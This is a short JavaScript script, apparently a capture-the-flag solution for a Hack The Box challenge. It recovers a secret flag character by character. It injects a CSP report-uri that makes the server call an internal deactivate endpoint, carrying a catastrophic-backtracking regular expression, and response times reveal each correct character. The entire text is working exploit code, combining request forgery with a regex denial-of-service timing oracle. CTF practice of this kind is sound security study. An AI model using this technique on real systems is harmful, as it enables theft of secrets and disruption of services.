var letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
var payload = "";
for(var l=0; l<length_of_flag; l++){
    for(var i=0; i<letters.length; i++){
        var secretCode = encodeURIComponent("^(?=HTB{"+payload+letters[i]+".*})((.*)*)*salt$");
        var sendDate = (new Date()).getTime();
        var timelapsed = await fetch("/api/evaluate", {
          "headers": {
            "content-type": "application/json"
          },
          "body": "{\"csp\":\"report-uri http://127.1:1337/deactivate?secretCode="+secretCode+"\\n\"}",
          "method": "POST",
          "mode": "cors",
          "credentials": "include"
        }).then(function(res){var receiveDate = (new Date()).getTime();var responseTimeMs = receiveDate-sendDate;return responseTimeMs/1000;});;
        if(timelapsed > 2) {
            payload = payload.concat(letters[i]);
            break;
        }
    }
}
console.log(payload);
